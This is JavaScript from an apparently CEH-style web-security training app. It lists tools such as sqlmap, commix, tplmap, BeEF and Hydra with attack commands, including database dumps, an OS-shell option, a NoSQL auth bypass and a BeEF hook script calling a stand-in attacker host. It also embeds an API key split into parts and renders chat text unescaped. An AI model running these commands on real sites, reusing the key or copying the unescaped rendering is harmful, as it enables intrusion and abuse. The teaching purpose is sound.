const keyP1 = "gsk_OCCHNxtXBVzq8";
        const keyP2 = "GdGCu99WGdyb3FY";
        const keyP3 = "sqdvAWM3jBcoxcwJaUrC8EGa";
        const apiKey = keyP1 + keyP2 + keyP3;

        const MODULE_KEY = 'module_webapp_completed';
        const CUSTOM_TOOLS_KEY = 'webapp_custom_tools';
        const EDITED_TOOLS_KEY = 'webapp_edited_default_tools';
        const DELETED_TOOLS_KEY = 'webapp_deleted_default_indices';
        const CUSTOM_CATS_KEY = 'webapp_custom_categories';

        const defaultTools = [
            // ── Injection Attacks ──────────────────────────────────
            {
                name: "1. SQLmap",
                link: "https://sqlmap.org",
                category: "Injection",
                brief: "The most powerful automated SQL injection tool that exists. SQL injection is when an attacker sneaks raw database commands into a web form (like a login box) instead of normal input — if the website doesn't sanitize that input, the database executes the attacker's command. SQLmap automates finding these vulnerabilities and then exploiting them to dump entire databases, read files, or even get a shell on the server.",
                use: "Test a URL for SQLi: <code>sqlmap -u 'http://target.com/page?id=1'</code><br>Dump all databases: <code>sqlmap -u 'http://target.com/page?id=1' --dbs</code><br>Dump a specific table: <code>sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump</code>",
                useful: "SQL injection consistently ranks #1-3 on OWASP Top 10 because a single vulnerable parameter can expose an entire customer database — names, emails, hashed passwords, credit card data. SQLmap turns a manual, hours-long process into a fully automated attack."
            },
            {
                name: "2. Commix",
                link: "https://github.com/commixproject/commix",
                category: "Injection",
                brief: "An automated tool for finding and exploiting command injection vulnerabilities — where a web app passes user input directly into a server-side shell command. If a website has a feature like 'ping this IP address' and doesn't sanitize the input, an attacker can append extra OS commands after the IP and the server will execute them.",
                use: "Test a URL parameter: <code>commix --url='http://target.com/ping.php?ip=127.0.0.1'</code><br>Test a POST request: <code>commix --url='http://target.com/ping.php' --data='ip=127.0.0.1'</code><br>It automatically tries multiple injection techniques and confirms exploitability.",
                useful: "Command injection is often more severe than SQL injection because it gives direct OS-level command execution — not just database access, but the ability to read any file, install backdoors, or pivot to the internal network."
            },
            {
                name: "3. NoSQLMap",
                link: "https://github.com/codingo/NoSQLMap",
                category: "Injection",
                brief: "SQLmap's counterpart for NoSQL databases like MongoDB. Modern web apps increasingly use NoSQL databases, which have their own injection syntax (using operators like $ne, $gt instead of SQL keywords). NoSQLMap automates testing and exploiting these NoSQL-specific injection flaws, including authentication bypass techniques unique to MongoDB-backed login forms.",
                use: "Run interactively: <code>python nosqlmap.py</code> then follow the menu to set target URL and select MongoDB attack mode.<br>Common manual auth bypass payload to test first: <code>{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}</code>",
                useful: "As more apps migrate to MongoDB and similar databases, traditional SQLi testing misses these vulnerabilities entirely. NoSQLMap fills that gap — a classic NoSQL auth bypass can log you in as any user without knowing any password."
            },
            {
                name: "4. tplmap",
                link: "https://github.com/epinna/tplmap",
                category: "Injection",
                brief: "A tool for detecting and exploiting Server-Side Template Injection (SSTI) — a vulnerability where a web app embeds user input directly into a template engine (like Jinja2, Twig, or Freemarker) instead of treating it as plain text. If exploitable, an attacker can run arbitrary code on the server through template syntax.",
                use: "Test a URL parameter: <code>python tplmap.py -u 'http://target.com/page?name=test'</code><br>If vulnerable, get an OS shell directly: <code>python tplmap.py -u 'http://target.com/page?name=test' --os-shell</code>",
                useful: "SSTI is a rapidly growing vulnerability class as more frameworks use templating for dynamic content. Unlike XSS (which runs in the victim's browser), a successful SSTI exploit runs code directly on the server — making it one of the most severe web vulnerabilities possible."
            },
            // ── Client-Side Attacks ────────────────────────────────
            {
                name: "5. XSStrike",
                link: "https://github.com/s0md3v/XSStrike",
                category: "ClientSide",
                brief: "An advanced Cross-Site Scripting (XSS) detection suite. XSS happens when a website lets an attacker inject malicious JavaScript that runs in other users' browsers — for example, in a comment field. XSStrike doesn't just send generic payloads; it analyzes the page's response and crafts a custom-tailored payload that bypasses the specific filtering the website uses.",
                use: "Scan a URL: <code>python xsstrike.py -u 'http://target.com/search?q=test'</code><br>Crawl and test the entire site: <code>python xsstrike.py -u 'http://target.com' --crawl</code><br>It reports confirmed XSS with the exact working payload.",
                useful: "XSS can steal session cookies (allowing full account takeover), deface websites, or redirect users to phishing pages — all by running JavaScript in a victim's authenticated browser session. XSStrike's intelligent payload generation finds bypasses that generic scanners miss."
            },
            {
                name: "6. BeEF (Browser Exploitation Framework)",
                link: "https://beefproject.com",
                category: "ClientSide",
                brief: "A framework that weaponizes a successful XSS finding. Once you've confirmed a website is vulnerable to XSS, BeEF lets you 'hook' visiting browsers — meaning their browser silently connects back to your control panel. From there you can run commands in their browser context: steal cookies, log keystrokes, take screenshots, or even attempt to exploit browser plugins.",
                use: "Start BeEF: <code>beef-xss</code> (default creds beef:beef, change immediately)<br>Inject the hook script via a found XSS: <code>&lt;script src=\"http://your-ip:3000/hook.js\"&gt;&lt;/script&gt;</code><br>Once hooked, control the browser from the web UI at <code>http://127.0.0.1:3000/ui/panel</code>",
                useful: "Demonstrates the real business impact of an XSS finding to clients — 'I found XSS' sounds abstract, but 'I can now control any visitor's browser, steal their session, and pivot into their internal network' makes the risk concrete during a pentest report."
            },
            {
                name: "7. CSRF Tester",
                link: "https://owasp.org/www-project-web-security-testing-guide/",
                category: "ClientSide",
                brief: "CSRF (Cross-Site Request Forgery) tricks a logged-in user's browser into submitting an unwanted request to a website they're authenticated on — like changing their email or transferring funds — without their knowledge, simply by visiting a malicious page. CSRF testing involves manually building a malicious HTML form/auto-submit page and checking if the target app executes the action without a CSRF token check.",
                use: "Manual test — build an auto-submitting form mimicking a real request:<br><code>&lt;form action=\"http://target.com/change-email\" method=\"POST\"&gt;&lt;input name=\"email\" value=\"attacker@evil.com\"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code><br>Host it and check if visiting it (while logged into target.com) actually changes the email.",
                useful: "CSRF vulnerabilities are about understanding that the browser automatically attaches cookies to any request — the attack doesn't need to steal a session, just trick the browser into using an existing one. Testing reveals if a site is missing CSRF tokens or SameSite cookie protections."
            },
            {
                name: "8. DOM Invader",
                link: "https://portswigger.net/burp/documentation/desktop/tools/dom-invader",
                category: "ClientSide",
                brief: "A Burp Suite browser extension specifically for finding DOM-based XSS — a trickier variant where the vulnerability exists entirely in client-side JavaScript (not server responses). DOM Invader instruments the browser to track 'taint' — following user-controllable data through JavaScript execution to find where it unsafely reaches dangerous functions like innerHTML or eval().",
                use: "Enable DOM Invader in Burp's embedded browser (Settings panel). Browse the target site normally. DOM Invader automatically flags potential DOM XSS sinks and sources, and provides a 'canary' value you inject to trace exactly where untrusted data flows unsafely.",
                useful: "DOM-based XSS is invisible to traditional scanners because the vulnerable code never touches the server — it's pure client-side JavaScript logic. As modern web apps use more JavaScript frameworks (React, Vue, Angular), DOM XSS has become increasingly common and harder to spot manually."
            },
            // ── Authentication Flaws ────────────────────────────────
            {
                name: "9. Burp Suite",
                link: "https://portswigger.net/burp",
                category: "AuthFlaws",
                brief: "The industry-standard web application security testing platform. It works as an intercepting proxy — sitting between your browser and the target website, letting you see and modify every single request and response. Used for manual testing of authentication flows: session token analysis, password reset logic flaws, IDOR (Insecure Direct Object Reference), and rate-limit bypasses.",
                use: "Set browser proxy to 127.0.0.1:8080, start Burp. Browse the target normally — every request appears in 'Proxy > HTTP History'. Right-click any request, send to 'Repeater' to manually modify and resend it (e.g., change a user ID parameter to test IDOR).",
                useful: "It is the single most-used tool in professional web app pentesting. Authentication and authorization flaws are rarely found by automated scanners — they require a human to notice 'wait, why does changing this user_id parameter let me see someone else's data?' Burp is the platform that makes that manual analysis possible."
            },
            {
                name: "10. Hydra (Web Auth Use)",
                link: "https://github.com/vanhauser-thc/thc-hydra",
                category: "AuthFlaws",
                brief: "Already covered for SSH/FTP in System Hacking, Hydra is equally essential for web authentication testing — brute-forcing login forms to test if the application enforces account lockout, rate limiting, or CAPTCHA after repeated failed attempts.",
                use: "Test a login form: <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'</code><br>The final part after the second colon is the failure string the app returns on a wrong password.",
                useful: "Many web apps still lack proper rate limiting on login endpoints. Testing this with Hydra reveals whether an attacker can brute-force their way into an account given enough time — a finding that consistently shows up in OWASP's Broken Authentication category."
            },
            {
                name: "11. JWT_Tool",
                link: "https://github.com/ticarpi/jwt_tool",
                category: "AuthFlaws",
                brief: "A toolkit specifically for testing JSON Web Tokens (JWT) — the encoded tokens many modern apps use for authentication instead of traditional sessions. JWT_Tool checks for classic JWT implementation flaws: the 'alg:none' bypass (telling the server not to verify the signature), weak signing secrets that can be brute-forced, and algorithm confusion attacks (RS256 to HS256 downgrade).",
                use: "Decode a JWT to inspect its contents: <code>python3 jwt_tool.py &lt;token&gt;</code><br>Test for known vulnerabilities automatically: <code>python3 jwt_tool.py &lt;token&gt; -M at</code><br>Crack a weak signing secret: <code>python3 jwt_tool.py &lt;token&gt; -C -d wordlist.txt</code>",
                useful: "JWT misconfigurations are a recurring critical finding in modern API-driven applications. A successful 'alg:none' bypass or cracked signing secret lets an attacker forge a token claiming to be any user — including an admin — without ever knowing a password."
            },
            // ── Recon & Fuzzing ─────────────────────────────────────
            {
                name: "12. Gobuster",
                link: "https://github.com/OJ/gobuster",
                category: "ReconFuzzing",
                brief: "A fast directory and file brute-forcing tool written in Go. Web servers often have hidden directories, admin panels, backup files, or config files that aren't linked anywhere on the visible site. Gobuster takes a wordlist of common names and rapidly checks if each one exists on the target, revealing hidden attack surface.",
                use: "Directory brute force: <code>gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</code><br>Subdomain brute force: <code>gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt</code><br>Specify file extensions to check: <code>gobuster dir -u http://target.com -w wordlist.txt -x php,txt,bak</code>",
                useful: "Finding that hidden /admin/ panel, an exposed /.git/ folder (which can leak entire source code), or a forgotten /backup.zip file is often how a pentest goes from 'nothing obvious' to 'full compromise' in minutes."
            },
            {
                name: "13. ffuf (Fuzz Faster U Fool)",
                link: "https://github.com/ffuf/ffuf",
                category: "ReconFuzzing",
                brief: "An extremely fast, flexible web fuzzer written in Go. Where Gobuster is specialized for directories, ffuf can fuzz literally any part of an HTTP request — URL paths, parameters, headers, POST data, even the Host header for virtual host discovery. It's become the modern standard for web fuzzing due to its raw speed and flexibility.",
                use: "Directory fuzzing: <code>ffuf -w wordlist.txt -u http://target.com/FUZZ</code><br>Parameter fuzzing: <code>ffuf -w wordlist.txt -u 'http://target.com/page?FUZZ=test'</code><br>Virtual host discovery: <code>ffuf -w subdomains.txt -u http://target.com -H 'Host: FUZZ.target.com'</code>",
                useful: "Modern web apps hide entire applications behind virtual hosts that don't show up in normal DNS enumeration. ffuf's Host-header fuzzing finds internal apps like admin.target.com or api-staging.target.com that are only reachable if you know the exact subdomain to request."
            },
            {
                name: "14. OWASP ZAP",
                link: "https://www.zaproxy.org",
                category: "ReconFuzzing",
                brief: "The free, open-source alternative to Burp Suite, maintained by OWASP itself. It combines an intercepting proxy with an automated vulnerability scanner — meaning it can both let you manually inspect traffic AND automatically crawl a site checking for common vulnerabilities like XSS, SQLi, and missing security headers, all in one tool.",
                use: "Launch ZAP, enter target URL in the 'Quick Start' tab, click 'Attack' for automated spider + active scan. For manual testing, set browser proxy to 127.0.0.1:8080 just like Burp, and use the 'Break' tabs to intercept requests.",
                useful: "Free and fully scriptable (great for CI/CD pipeline integration to catch vulnerabilities before deployment). For students and budget-conscious testers, ZAP delivers most of Burp Suite's core functionality without the paid license."
            },
            {
                name: "15. Wfuzz",
                link: "https://github.com/xmendez/wfuzz",
                category: "ReconFuzzing",
                brief: "One of the original web application fuzzers, predating ffuf. It replaces any part of an HTTP request with the keyword FUZZ and tests it against a wordlist — directories, parameters, values, headers. While ffuf has largely replaced it for speed, Wfuzz remains popular for its rich filtering options (by response code, size, word count) that make sorting through thousands of results manageable.",
                use: "Basic directory fuzz: <code>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ</code><br>Filter by response size to reduce noise: <code>wfuzz -c -z file,wordlist.txt --hh 4242 http://target.com/FUZZ</code> (hides responses of exactly 4242 bytes, usually the default 404 page size)",
                useful: "Real-world fuzzing returns thousands of results, most of them false positives (default error pages). Wfuzz's filtering by hide-code, hide-size, or hide-words turns an unusable wall of noise into a short list of genuinely interesting findings."
            }
        ];

        let tools = [];
        let editingToolIndex = null;

        function init() {
            const list = document.getElementById('toolList');
            list.innerHTML = '';

            const categories = { "Injection": [], "ClientSide": [], "AuthFlaws": [], "ReconFuzzing": [] };
            const catDisplayNames = {
                "Injection": "💉 Injection Attacks",
                "ClientSide": "🖥️ Client-Side Attacks",
                "AuthFlaws": "🔓 Authentication Flaws",
                "ReconFuzzing": "🔍 Recon & Fuzzing"
            };

            try {
                const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                for (const [k, v] of Object.entries(customCats)) { categories[k] = []; catDisplayNames[k] = v; }
            } catch (e) { console.error(e); }

            tools.forEach((tool, index) => {
                const cat = tool.category || "Injection";
                if (categories[cat]) categories[cat].push({ tool, index });
                else categories["Injection"].push({ tool, index });
            });

            for (const [catName, catTools] of Object.entries(categories)) {
                if (catTools.length === 0) continue;
                const h = document.createElement('div');
                h.className = 'category-header';
                h.innerText = catDisplayNames[catName];
                list.appendChild(h);
                catTools.forEach(({ tool, index }) => {
                    const div = document.createElement('div');
                    div.className = 'tool-item';
                    div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
                    div.onclick = () => showDetails(index, div);
                    list.appendChild(div);
                });
            }

            if (apiKey.includes("YOUR_MIDDLE_PART")) {
                document.getElementById('statusDot').classList.remove('online');
                addBotMessage("⚠️ API key not configured. Update keyP1/keyP2/keyP3 in the HTML.");
            }
        }

        function reloadAllTools() {
            tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
            try {
                const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
                tools = tools.filter(t => !del.includes(t.originalIndex));
            } catch (e) { }
            try {
                const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
                tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
            } catch (e) { }
            loadCustomTools();
            init();
        }

        function showDetails(index, element) {
            document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            const tool = tools[index];
            const catClass = `badge-${tool.category.toLowerCase()}`;
            const displayCatName = tool.category.replace(/_/g, ' ');
            document.getElementById('detailsPanel').innerHTML = `
                <div class="card">
                    <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                        <span>${tool.name.split('.')[1]?.trim() || tool.name}<span class="badge ${catClass}">${displayCatName}</span></span>
                        <div style="display:flex;gap:8px;align-items:center;">
                            <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                            <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                            <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                        </div>
                    </h1>
                    <div class="section-label">Simply Explained (What is it?)</div>
                    <div class="section-content">${tool.brief}</div>
                    <div class="section-label">How to actually use it</div>
                    <div class="section-content">${tool.use}</div>
                    <div class="section-label">Why Hackers care about this</div>
                    <div class="section-content">${tool.useful}</div>
                </div>`;
            if (window.innerWidth <= 768) switchMobileTab('details');
        }

        function handleEnter(e) { if (e.key === 'Enter') sendMessage(); }

        async function sendMessage() {
            const inputEl = document.getElementById('chatInput');
            const msg = inputEl.value.trim();
            if (!msg) return;
            addUserMessage(msg);
            inputEl.value = '';

            if (!apiKey || apiKey.includes("YOUR_MIDDLE_PART")) {
                setTimeout(() => addBotMessage("❌ Missing Groq API Key. Edit keyP1/keyP2/keyP3."), 500);
                return;
            }

            const toolsContext = tools.map(t => `${t.name.split('.')[1]?.trim() || t.name}: ${t.brief}`).join(" | ");
            const systemPrompt = `You are a focused cybersecurity assistant specialising in MODULE 06: Web Application Threats. Your primary topics are the OWASP Top 10: SQL injection, command injection, server-side template injection, XSS (stored, reflected, DOM-based), CSRF, broken authentication, JWT vulnerabilities, IDOR, security misconfiguration, and the tools used to find them — SQLmap, Burp Suite, OWASP ZAP, XSStrike, BeEF, Gobuster, ffuf.

Answer questions on these topics directly and in beginner-friendly language using analogies where helpful. You can also answer general cybersecurity questions outside this scope — but briefly connect them back to web application security concepts where relevant.

Key concept to explain clearly when relevant: Web Application Threats are different from the previous modules (network scanning, enumeration, system hacking) because the attack surface is the APPLICATION LOGIC running on top of the network/OS layer — a server can have zero open ports of concern and zero OS vulnerabilities, yet still be completely compromised through a single unsanitized input field in a web form.

When writing commands or code, ALWAYS use markdown fenced code blocks (\`\`\`bash, \`\`\`html, \`\`\`sql as appropriate) or inline backticks.

Tool context for this module: ${toolsContext}.

Be direct, no fluff, never vague. If a user asks for help attacking a live website they don't own or have written authorization to test, remind them this is for authorized learning/lab environments only (CEH exam prep, OWASP Juice Shop, DVWA, bWAPP, home labs, CTFs) — not real-world unauthorized access. Unauthorized web app attacks are illegal under laws like the IT Act 2000 in India and the CFAA in the US.`;

            const loadingId = "load-" + Date.now();
            try {
                showTypingIndicator(loadingId);
                const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${apiKey}` },
                    body: JSON.stringify({
                        model: "openai/gpt-oss-20b",
                        messages: [{ role: "system", content: systemPrompt }, { role: "user", content: msg }]
                    })
                });
                const data = await response.json();
                document.getElementById(loadingId)?.remove();
                if (data.error) addBotMessage(`Groq API Error: ${data.error.message}`);
                else addBotMessage(formatMarkdown(data.choices[0].message.content));
            } catch (error) {
                document.getElementById(loadingId)?.remove();
                addBotMessage(`Network Error: Failed to reach Groq API.`);
            }
        }

        function formatMarkdown(text) {
            let html = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
            html = html.replace(/```(\w*)\n([\s\S]*?)```/g, (m, lang, code) => `<pre><code class="language-${lang}">${code.trim()}</code></pre>`);
            html = html.replace(/`([^`\n]+)`/g, '<code>$1</code>');
            html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
            let lines = html.split('\n'); let inList = false;
            for (let i = 0; i < lines.length; i++) {
                const line = lines[i].trim();
                if (line.startsWith('* ') || line.startsWith('- ')) {
                    const content = line.substring(2);
                    lines[i] = inList ? `<li>${content}</li>` : `<ul><li>${content}</li>`;
                    inList = true;
                } else { if (inList) { lines[i] = '</ul>' + lines[i]; inList = false; } }
            }
            if (inList) lines[lines.length - 1] += '</ul>';
            html = lines.join('\n').replace(/\n/g, '<br>');
            html = html.replace(/<\/pre><br>/g, '</pre>').replace(/<\/ul><br>/g, '</ul>').replace(/<\/li><br>/g, '</li>').replace(/<ul><br>/g, '<ul>');
            return html;
        }

        function showTypingIndicator(id) {
            const h = document.getElementById('chatHistory');
            h.innerHTML += `<div class="msg bot typing-indicator" id="${id}"><span></span><span></span><span></span></div>`;
            h.scrollTop = h.scrollHeight;
        }
        function addUserMessage(text) { const h = document.getElementById('chatHistory'); h.innerHTML += `<div class="msg user">${text}</div>`; h.scrollTop = h.scrollHeight; }
        function addBotMessage(text) { const h = document.getElementById('chatHistory'); h.innerHTML += `<div class="msg bot">${text}</div>`; h.scrollTop = h.scrollHeight; }

        function switchMobileTab(tabId) {
            document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
            document.body.className = document.body.className.replace(/\btab-\w+\b/g, '').trim();
            document.body.classList.add('tab-' + tabId);
        }

        function updateCompletionButton() {
            const btn = document.getElementById('completeModuleBtn');
            if (!btn) return;
            const done = localStorage.getItem(MODULE_KEY) === 'true';
            btn.innerText = done ? "✓ Module Completed" : "Mark Module Completed";
            btn.classList.toggle('completed', done);
        }
        function toggleModuleCompletion() {
            localStorage.setItem(MODULE_KEY, !(localStorage.getItem(MODULE_KEY) === 'true'));
            updateCompletionButton();
        }

        function openAddToolModal() {
            editingToolIndex = null;
            document.querySelector('#addToolModal h3').innerText = "Add Custom Tool";
            document.querySelector('#addToolForm button[type="submit"]').innerText = "Add Tool";
            document.getElementById('addToolForm').reset();
            cancelNewCategory(); loadCustomCategories();
            const modal = document.getElementById('addToolModal');
            modal.style.display = 'flex'; modal.offsetHeight; modal.classList.add('active');
            document.getElementById('toolName').focus();
        }

        function openEditToolModal(index) {
            editingToolIndex = index;
            const tool = tools[index];
            document.querySelector('#addToolModal h3').innerText = "Edit Tool Info";
            document.querySelector('#addToolForm button[type="submit"]').innerText = "Save Changes";
            document.getElementById('addToolForm').reset();
            cancelNewCategory(); loadCustomCategories();
            document.getElementById('toolName').value = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name.trim();
            document.getElementById('toolLink').value = tool.link;
            document.getElementById('toolCategory').value = tool.category;
            document.getElementById('toolBrief').value = tool.brief;
            document.getElementById('toolUse').value = tool.use;
            document.getElementById('toolUseful').value = tool.useful;
            const modal = document.getElementById('addToolModal');
            modal.style.display = 'flex'; modal.offsetHeight; modal.classList.add('active');
        }

        function closeAddToolModal() {
            const modal = document.getElementById('addToolModal');
            modal.classList.remove('active');
            setTimeout(() => { modal.style.display = 'none'; document.getElementById('addToolForm').reset(); }, 300);
        }

        function loadCustomTools() {
            try {
                const stored = localStorage.getItem(CUSTOM_TOOLS_KEY);
                if (stored) {
                    JSON.parse(stored).forEach((tool, idx) => {
                        const match = tool.name.match(/^\d+\.\s*(.*)$/);
                        tool.name = `${tools.length + 1}. ${match ? match[1] : tool.name}`;
                        tool.originalIndex = null; tool.customIndex = idx;
                        tools.push(tool);
                    });
                }
            } catch (e) { console.error(e); }
        }

        function submitNewTool(e) {
            e.preventDefault();
            const vals = { name: document.getElementById('toolName').value.trim(), link: document.getElementById('toolLink').value.trim(), category: document.getElementById('toolCategory').value, brief: document.getElementById('toolBrief').value.trim(), use: document.getElementById('toolUse').value.trim(), useful: document.getElementById('toolUseful').value.trim() };

            if (editingToolIndex !== null) {
                const orig = tools[editingToolIndex];
                if (orig.originalIndex !== null) {
                    const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
                    edited[orig.originalIndex] = vals;
                    localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
                } else {
                    const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                    ct[orig.customIndex] = vals;
                    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
                }
            } else {
                const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                ct.push(vals);
                localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
            }

            closeAddToolModal(); reloadAllTools();
            setTimeout(() => {
                let foundIndex = 0, newToolEl = null;
                tools.forEach((t, idx) => { if ((t.name.includes('.') ? t.name.split('.')[1].trim() : t.name.trim()) === vals.name) foundIndex = idx; });
                document.querySelectorAll('.tool-item').forEach(el => { if (el.innerText === vals.name) newToolEl = el; });
                if (newToolEl) showDetails(foundIndex, newToolEl);
            }, 100);
        }

        function confirmDeleteTool(index) {
            const rawName = tools[index].name.includes('.') ? tools[index].name.split('.')[1].trim() : tools[index].name.trim();
            if (confirm(`Delete "${rawName}"?`)) deleteTool(index);
        }

        function deleteTool(index) {
            const tool = tools[index];
            if (tool.originalIndex !== null) {
                const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
                if (!del.includes(tool.originalIndex)) { del.push(tool.originalIndex); localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del)); }
            } else {
                const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                ct.splice(tool.customIndex, 1);
                localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
            }
            reloadAllTools();
            document.getElementById('detailsPanel').innerHTML = `<div style="text-align:center;color:var(--text-muted);margin-top:20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>`;
        }

        function loadCustomCategories() {
            try {
                const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                const sel = document.getElementById('toolCategory');
                sel.innerHTML = `
                    <option value="Injection">💉 Injection Attacks</option>
                    <option value="ClientSide">🖥️ Client-Side Attacks</option>
                    <option value="AuthFlaws">🔓 Authentication Flaws</option>
                    <option value="ReconFuzzing">🔍 Recon & Fuzzing</option>`;
                for (const [k, v] of Object.entries(customCats)) {
                    const opt = document.createElement('option');
                    opt.value = k; opt.innerText = v; sel.appendChild(opt);
                }
            } catch (e) { }
        }

        function showNewCategoryForm() { document.getElementById('newCategoryGroup').style.display = 'block'; document.getElementById('newCategoryName').focus(); }
        function cancelNewCategory() { document.getElementById('newCategoryGroup').style.display = 'none'; document.getElementById('newCategoryName').value = ''; document.getElementById('newCategoryIcon').value = ''; }
        function saveNewCategory() {
            const name = document.getElementById('newCategoryName').value.trim();
            const icon = document.getElementById('newCategoryIcon').value.trim() || "📁";
            if (!name) return;
            const key = name.replace(/\s+/g, '_');
            try {
                const cc = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                cc[key] = `${icon} ${name}`; localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(cc));
            } catch (e) { }
            loadCustomCategories(); document.getElementById('toolCategory').value = key; cancelNewCategory();
        }

        window.addEventListener('click', e => { if (e.target === document.getElementById('addToolModal')) closeAddToolModal(); });
        window.addEventListener('keydown', e => { if (e.key === 'Escape') closeAddToolModal(); });

        // Tab switching
        function switchPanelTab(tabId) {
            document.querySelectorAll('.chat-panel .tab-content').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.chat-panel .panel-tab').forEach(btn => btn.classList.remove('active'));
            
            if (tabId === 'chat') {
                document.getElementById('chatTabContent').style.display = 'flex';
            } else if (tabId === 'terminal') {
                document.getElementById('terminalTabContent').style.display = 'flex';
                document.getElementById('terminalInput').focus();
            } else if (tabId === 'quiz') {
                document.getElementById('quizTabContent').style.display = 'flex';
            }
            
            // Set active button style
            const tabBtn = Array.from(document.querySelectorAll('.chat-panel .panel-tab')).find(btn => btn.innerText.toLowerCase().includes(tabId));
            if (tabBtn) tabBtn.classList.add('active');
        }

        // Terminal logic
        function handleTerminalEnter(event) {
            if (event.key === 'Enter') {
                const inputEl = document.getElementById('terminalInput');
                const cmd = inputEl.value.trim();
                if (!cmd) return;
                
                // Add to terminal output
                const outEl = document.getElementById('terminalOutput');
                outEl.innerHTML += `<div><span style="color: #34d399;">guest@cyberx:~$</span> ${cmd}</div>`;
                
                // Run mock command
                runMockTerminalCommand(cmd);
                
                inputEl.value = '';
                outEl.scrollTop = outEl.scrollHeight;
            }
        }

        function runMockTerminalCommand(cmd) {
            const outEl = document.getElementById('terminalOutput');
            const cleanCmd = cmd.toLowerCase().trim();
            const parts = cleanCmd.split(/\s+/);
            const baseCmd = parts[0];

            if (baseCmd === 'clear') {
                outEl.innerHTML = '';
                return;
            }

            if (baseCmd === 'help') {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    Available commands:<br>
                    - <span style="color: #fbbf24;">sqlmap -u "[url]" --dbs</span>: Run mock SQL Injection scanner<br>
                    - <span style="color: #fbbf24;">dirb [url]</span>: Run directory search brute-forcer<br>
                    - <span style="color: #fbbf24;">wpscan --url [url]</span>: Run WordPress security scan<br>
                    - <span style="color: #fbbf24;">xsstrike -u [url]</span>: Test for parameter XSS reflection<br>
                    - <span style="color: #fbbf24;">clear</span>: Clear screen<br>
                    - <span style="color: #fbbf24;">help</span>: Show this menu
                </div>`;
                return;
            }

            if (baseCmd === 'sqlmap' || cleanCmd.startsWith('sqlmap ')) {
                if (cleanCmd.includes('-u')) {
                    outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                        ___<br>
                       /__H__<br>
                      |_ _|_|  sqlmap 1.5.11#stable<br>
                      |_|_|_|<br>
                     http://sqlmap.org<br>
                    ---------------------------------------------------<br>
                    [*] testing connection to target URL<br>
                    [*] testing if GET parameter 'id' is dynamic<br>
                    [+] GET parameter 'id' is vulnerability to SQL Injection!<br>
                    [*] fetching database names...<br>
                    available databases [2]:<br>
                    [*] information_schema<br>
                    [*] <span style="color: #34d399; font-weight: bold;">cyberx_db</span>
                </div>`;
                } else {
                    outEl.innerHTML += `<div style="color: #ef4444;">Usage: sqlmap -u "[url]" --dbs</div>`;
                }
                return;
            }

            if (baseCmd === 'dirb' || cleanCmd.startsWith('dirb ')) {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    -----------------<br>
                    DIRB v2.22<br>
                    By DarkRaider<br>
                    -----------------<br>
                    START_TIME: Tue Jun 30 08:25:12 2026<br>
                    URL_BASE: http://target.com/<br>
                    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>
                    -----------------<br>
                    GENERATED WORDS: 4612<br><br>
                    + http://target.com/admin/ (CODE:200|SIZE:1422)<br>
                    + http://target.com/config.php (CODE:200|SIZE:0)<br>
                    + http://target.com/images/ (CODE:301|SIZE:312)<br>
                    + http://target.com/uploads/ (CODE:301|SIZE:314)<br>
                    -----------------<br>
                    DOWNLOADED: 4612 - FOUND: 4
                </div>`;
                return;
            }

            if (baseCmd === 'wpscan' || cleanCmd.startsWith('wpscan ')) {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    _______________________________________________________________<br>
                            __          _______   _____                 <br>
